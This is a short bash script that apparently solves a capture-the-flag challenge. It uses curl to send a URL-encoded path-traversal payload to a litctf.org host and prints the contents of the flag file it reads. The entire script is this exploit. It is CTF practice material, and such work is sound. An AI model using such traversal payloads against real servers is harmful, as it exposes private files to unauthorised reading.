#!/bin/bash

URL="http://litctf.org:31778/"
PAYLOAD="..%2F..%2Fapp%2Fflag.txt"

RESPONSE=$(curl -s "$URL$PAYLOAD")

echo $RESPONSE